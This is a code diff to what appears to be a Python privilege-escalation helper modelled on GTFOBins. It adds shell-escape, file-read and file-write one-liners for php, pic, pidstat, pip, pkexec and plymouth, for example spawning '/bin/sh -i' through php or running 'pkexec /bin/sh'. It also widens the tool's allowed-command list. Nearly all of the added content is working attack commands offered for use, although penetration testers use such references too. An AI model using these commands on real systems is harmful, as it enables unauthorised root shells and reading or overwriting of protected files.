@@ -2850,6 +2850,47 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "php":
+        if gtfo_options == "shell":
+            bins.append("php -r 'system(""/bin/sh -i"");'")
+        elif gtfo_options == "file-write":
+            bins.append("php -r 'file_put_contents(""/path/to/output-file"", ""DATA"");'")
+        elif gtfo_options == "file-read":
+            bins.append("php -r 'readfile(""/path/to/input-file"");'")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pic":
+        if gtfo_options == "shell":
+            bins.append("pic -U\n.PS\nsh X sh X")
+        elif gtfo_options == "file-read":
+            bins.append("pic /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pidstat":
+        if gtfo_options == "shell":
+            bins.append("pidstat -e /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pip":
+        if gtfo_options == "shell":
+            bins.append("pip config --editor '/bin/sh -s' edit")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pkexec":
+        if gtfo_options == "shell":
+            bins.append("pkexec /bin/sh")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "plymouth":
+        if gtfo_options == "shell":
+            bins.append("plymouth ask-for-password --prompt=x --command=/bin/sh")
+        else:
+            bins.append("N/A")
 
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
@@ -2897,7 +2938,8 @@ def main():
         "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", 
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
         "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "perf", 
-        "perl", "perlbug", "psexec","pg", "other",
+        "perl", "perlbug", "psexec","pg", "php", "pic", "pidstat", "pip", "pkexec", 
+        "plymouth" ,"other",
     }
 
     if start in ALLOWED:
